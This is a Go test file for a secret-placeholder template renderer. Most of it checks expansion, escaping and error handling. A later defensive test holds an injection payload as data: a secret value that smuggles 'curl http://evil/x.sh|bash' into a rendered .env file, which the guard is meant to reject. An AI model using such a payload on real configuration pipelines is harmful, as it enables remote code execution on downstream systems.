package secrettemplate

import (
	"errors"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// upper is a trivial resolver that echoes a value per ref, or errors on "missing".
func fakeResolve(ref string) (string, error) {
	if ref == "missing" {
		return "", errors.New("not found")
	}
	return "<" + ref + ">", nil
}

func TestRender_ExpandsReferences(t *testing.T) {
	out, err := Render("db=${secret:prod/db} api=${secret:prod/api}", fakeResolve)
	require.NoError(t, err)
	assert.Equal(t, "db=<prod/db> api=<prod/api>", out)
}

func TestRender_NoPlaceholders(t *testing.T) {
	out, err := Render("plain text, no refs, a lone $ and 100$ here", fakeResolve)
	require.NoError(t, err)
	assert.Equal(t, "plain text, no refs, a lone $ and 100$ here", out)
}

func TestRender_DollarEscape(t *testing.T) {
	// "$$" collapses to "$", so "$${secret:x}" is the literal "${secret:x}".
	out, err := Render("price=$$5 and $${secret:prod/db}", fakeResolve)
	require.NoError(t, err)
	assert.Equal(t, "price=$5 and ${secret:prod/db}", out)
}

func TestRender_TrimsRef(t *testing.T) {
	out, err := Render("${secret:  prod/db  }", fakeResolve)
	require.NoError(t, err)
	assert.Equal(t, "<prod/db>", out)
}

func TestRender_Errors(t *testing.T) {
	t.Run("unterminated", func(t *testing.T) {
		_, err := Render("oops ${secret:prod/db", fakeResolve)
		require.Error(t, err)
		assert.Contains(t, err.Error(), "unterminated")
	})
	t.Run("empty ref", func(t *testing.T) {
		_, err := Render("${secret:}", fakeResolve)
		require.Error(t, err)
		assert.Contains(t, err.Error(), "empty secret reference")
	})
	t.Run("resolver error names the ref", func(t *testing.T) {
		_, err := Render("x=${secret:missing}", fakeResolve)
		require.Error(t, err)
		assert.Contains(t, err.Error(), `resolve "missing"`)
	})
}

func TestRender_AdjacentAndRepeated(t *testing.T) {
	out, err := Render("${secret:a}${secret:a}${secret:b}", fakeResolve)
	require.NoError(t, err)
	assert.Equal(t, "<a><a><b>", out)
}

func TestReferences(t *testing.T) {
	refs, err := References("${secret:prod/db} then ${secret:prod/api} then ${secret:prod/db} again")
	require.NoError(t, err)
	assert.Equal(t, []string{"prod/db", "prod/api"}, refs, "distinct, first-seen order")
}

func TestReferences_PropagatesMalformed(t *testing.T) {
	_, err := References("${secret:unterminated")
	require.Error(t, err)
}

// A secret value with no embedded control characters — the overwhelmingly common case
// — must render byte-for-byte unchanged; the new injection guard must not alter or
// reject legitimate values.
func TestRender_PlainValueUnchanged(t *testing.T) {
	resolve := func(ref string) (string, error) {
		return "S3cr3t!Value-With.Punct_And Spaces", nil
	}
	out, err := Render("DB_PASSWORD=${secret:prod/db}", resolve)
	require.NoError(t, err)
	assert.Equal(t, "DB_PASSWORD=S3cr3t!Value-With.Punct_And Spaces", out)
}

// A secret value carrying an embedded newline, carriage return, or NUL byte must abort
// the render (matching Render's existing all-or-nothing failure model for a resolver
// error) rather than silently splicing extra lines/bytes into the output — this is the
// injection vector documented in #325: a low-trust secret-writer smuggling
// "\ncurl evil|bash\n#" into a rendered .env/config file that a downstream consumer may
// later source.
func TestRender_RejectsEmbeddedControlChars(t *testing.T) {
	cases := map[string]string{
		"newline":          "foo\ncurl http://evil/x.sh|bash\n#",
		"carriage return":  "foo\rbar",
		"crlf":             "foo\r\nbar",
		"NUL byte":         "foo\x00bar",
		"newline mid-word": "sk_live_abc\ndef",
	}
	for name, val := range cases {
		t.Run(name, func(t *testing.T) {
			resolve := func(ref string) (string, error) { return val, nil }
			_, err := Render("SECRET=${secret:prod/db}", resolve)
			require.Error(t, err)
			assert.Contains(t, err.Error(), `resolve "prod/db"`)
			assert.Contains(t, err.Error(), "cannot be safely substituted")
		})
	}
}

// The rejection must fire per-reference: a template with an earlier clean reference and
// a later poisoned one must still fail (no partial output containing the clean value
// followed by a truncated/injected tail).
func TestRender_RejectsEmbeddedControlChars_NoPartialOutput(t *testing.T) {
	resolve := func(ref string) (string, error) {
		if ref == "prod/clean" {
			return "cleanvalue", nil
		}
		return "poison\nvalue", nil
	}
	out, err := Render("A=${secret:prod/clean} B=${secret:prod/dirty}", resolve)
	require.Error(t, err)
	assert.Empty(t, out)
}
